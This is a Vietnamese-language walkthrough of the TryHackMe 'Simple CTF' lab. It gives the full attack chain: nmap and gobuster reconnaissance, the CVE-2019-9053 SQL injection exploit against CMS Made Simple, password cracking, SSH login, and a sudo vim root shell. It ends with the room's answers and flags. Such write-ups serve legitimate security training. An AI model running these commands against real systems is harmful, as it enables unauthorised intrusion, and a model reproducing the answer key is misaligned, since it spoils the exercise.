# Simple CTF

### 1. Giới thiệu <a href="#id-1-gi-e1-bb-9bi-thi-e1-bb-87u" id="id-1-gi-e1-bb-9bi-thi-e1-bb-87u"></a>

Đây là bài hướng dẫn chi tiết cho phòng "Simple CTF" trên TryHackMe. Mục tiêu là tìm được hai flag: user flag và root flag.

**IP Mục tiêu**: 10.49.146.14

### 2. Thu thập thông tin (Reconnaissance) <a href="#id-2-thu-th-e1-ba-adp-th-c3-b4ng-tin-reconnaissance" id="id-2-thu-th-e1-ba-adp-th-c3-b4ng-tin-reconnaissance"></a>

#### Quét cổng (Port Scanning) <a href="#qu-c3-a9t-c-e1-bb-95ng-port-scanning" id="qu-c3-a9t-c-e1-bb-95ng-port-scanning"></a>

Tôi bắt đầu với việc quét Nmap để xác định các cổng và dịch vụ đang mở.

```bash
nmap -sC -sV -p- -oN nmap_scan.txt 10.49.146.14
```

Kết quả quét:

```
# Nmap 7.95 scan initiated Sun Dec 28 00:57:42 2025 as: /usr/lib/nmap/nmap -sC -sV -p- -oN nmap_scan.txt 10.49.146.14
Nmap scan report for 10.49.146.14
Host is up (0.045s latency).
Not shown: 65530 filtered tcp ports (no-response), 2 filtered tcp ports (net-unreach)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.139.40
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 28 01:07:30 2025 -- 1 IP address (1 host up) scanned in 587.49 seconds
```

#### Liệt kê Web (Web Enumeration) <a href="#li-e1-bb-87t-k-c3-aa-web-web-enumeration" id="li-e1-bb-87t-k-c3-aa-web-web-enumeration"></a>

Truy cập máy chủ web trên cổng 80, tôi thấy trang mặc định. Sử dụng `gobuster` để tìm các thư mục ẩn:

```bash
gobuster dir -u http://10.49.146.14 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Kết quả tìm thấy thư mục `/simple`:

```
/.hta                 (Status: 403) [Size: 291]
/.hta.html            (Status: 403) [Size: 296]
/.hta.txt             (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 300]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 296]
/.hta.php             (Status: 403) [Size: 295]
/.htpasswd.html       (Status: 403) [Size: 301]
/index.html           (Status: 200) [Size: 11321]
/index.php            (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 315] [--> http://10.49.146.14/simple/]
```

Truy cập `http://10.49.146.14/simple`, tôi xác định ứng dụng là **CMS Made Simple**. Thông tin phiên bản ở cuối trang cho thấy nó có thể tồn tại lỗ hổng.

### 3. Phân tích lỗ hổng <a href="#id-3-ph-c3-a2n-t-c3-adch-l-e1-bb-97-h-e1-bb-95ng" id="id-3-ph-c3-a2n-t-c3-adch-l-e1-bb-97-h-e1-bb-95ng"></a>

Tìm kiếm lỗ hổng liên quan đến "CMS Made Simple":

```bash
searchsploit "CMS Made Simple"
```

Hoặc tìm kiếm trực tuyến cho thấy **CVE-2019-9053**, một lỗ hổng SQL Injection trong module News của CMS Made Simple các phiên bản < 2.2.10.

**Loại lỗ hổng**: SQL Injection (Time-Based Blind) **CVE**: CVE-2019-9053

### 4. Khai thác (Exploitation) <a href="#id-4-khai-th-c3-a1c-exploitation" id="id-4-khai-th-c3-a1c-exploitation"></a>

Tôi tải xuống script khai thác Python cho CVE-2019-9053. **Script khai thác**: [CVE-2019-9053 trên GitHub](https://github.com/e-renna/CVE-2019-9053)

Chạy script để trích xuất thông tin đăng nhập. Tôi sử dụng danh sách từ `rockyou.txt` để bẻ khóa (crack) mật khẩu tìm thấy trong cơ sở dữ liệu.

```bash
python3 exploit.py -u http://10.49.146.14/simple --crack -w /usr/share/wordlists/rockyou.txt
```

_Lưu ý: Cần sửa đổi nhỏ trong script để xử lý lỗi mã hóa UTF-8 bằng cách thêm `errors='ignore'` vào hàm `open()`._

Kết quả:

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: secret
[+] Password cracked: secret
```

### 5. Giành quyền truy cập (Gaining Access) <a href="#id-5-gi-c3-a0nh-quy-e1-bb-81n-truy-c-e1-ba-adp-gaining-access" id="id-5-gi-c3-a0nh-quy-e1-bb-81n-truy-c-e1-ba-adp-gaining-access"></a>

Với thông tin đăng nhập (`mitch`:`secret`), tôi thử đăng nhập. Vì cổng 2222 đang mở cho SSH, tôi thử kết nối qua đó.

```bash
ssh -p 2222 mitch@10.49.146.14
```

**Thành công!** Tôi đã đăng nhập được với tư cách người dùng `mitch`.

#### User Flag <a href="#user-flag" id="user-flag"></a>

Liệt kê các tập tin trong thư mục home:

```bash
ls -R /home
```

Kết quả:

```
/home:
mitch
sunbath

/home/mitch:
user.txt
ls: cannot open directory '/home/sunbath': Permission denied
```

**User Flag**: `G00d j0b, keep up!`

Tôi cũng nhận thấy một thư mục người dùng khác: `/home/sunbath`.

### 6. Leo thang đặc quyền (Privilege Escalation) <a href="#id-6-leo-thang-c4-91-e1-ba-b7c-quy-e1-bb-81n-privilege-escalation" id="id-6-leo-thang-c4-91-e1-ba-b7c-quy-e1-bb-81n-privilege-escalation"></a>

Kiểm tra quyền sudo của người dùng `mitch`:

```bash
sudo -l
```

Kết quả:

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Người dùng `mitch` có thể chạy `vim` với quyền root mà không cần mật khẩu. Đây là một vector tấn công GTFOBins kinh điển. Chúng ta có thể tạo shell hoặc thực thi lệnh từ bên trong vim.

#### Root Flag <a href="#root-flag" id="root-flag"></a>

Sử dụng `vim` để đọc trực tiếp root flag:

```bash
sudo vim -c ':!cat /root/root.txt' -c ':q!'
```

Hoặc tạo một root shell:

```bash
sudo vim -c ':!/bin/sh'
```

Kết quả:

```
W3ll d0n3. You made it!
```

**Root Flag**: `W3ll d0n3. You made it!`

### 7. Tổng hợp câu trả lời <a href="#id-7-t-e1-bb-95ng-h-e1-bb-a3p-c-c3-a2u-tr-e1-ba-a3-l-e1-bb-9di" id="id-7-t-e1-bb-95ng-h-e1-bb-a3p-c-c3-a2u-tr-e1-ba-a3-l-e1-bb-9di"></a>

1. **Có bao nhiêu dịch vụ đang chạy dưới cổng 1000?**
   * **2** (Cổng 21 và 80)
2. **Dịch vụ gì đang chạy trên cổng cao hơn?**
   * **ssh** (Cổng 2222)
3. **CVE bạn đang sử dụng chống lại ứng dụng là gì?**
   * **CVE-2019-9053**
4. **Ứng dụng dễ bị tấn công bởi loại lỗ hổng nào?**
   * **SQLi** (SQL Injection)
5. **Mật khẩu là gì?**
   * **secret**
6. **Bạn có thể đăng nhập ở đâu với thông tin chi tiết thu được?**
   * **ssh**
7. **User flag là gì?**
   * **G00d j0b, keep up!**
8. **Có người dùng nào khác trong thư mục home không? Tên là gì?**
   * **sunbath**
9. **Bạn có thể tận dụng điều gì để tạo ra một shell có đặc quyền?**
   * **vim**
10. **Root flag là gì?**
    * **W3ll d0n3. You made it!**
